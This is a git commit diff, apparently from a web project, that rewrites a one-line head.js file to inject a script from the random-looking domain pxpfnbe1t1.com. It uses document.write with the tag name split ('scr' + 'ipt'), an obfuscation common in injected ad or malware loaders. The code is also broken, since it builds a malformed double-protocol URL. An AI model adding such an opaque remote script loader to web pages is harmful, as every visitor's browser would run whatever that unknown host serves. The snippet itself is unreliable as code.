80c660ea598c883e9a9b5ee0eef68254ee5a7b07
mychiara <85479169+mychiara@users.noreply.github.com>
2022-03-30 23:34:03 +0800

    Update head.js

--- head.js
+++ head.js
@@ -1,1 +1,1 @@
-src="https://pxpfnbe1t1.com/script.js">
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://https://pxpfnbe1t1.com/script.js"></scr' + 'ipt>');
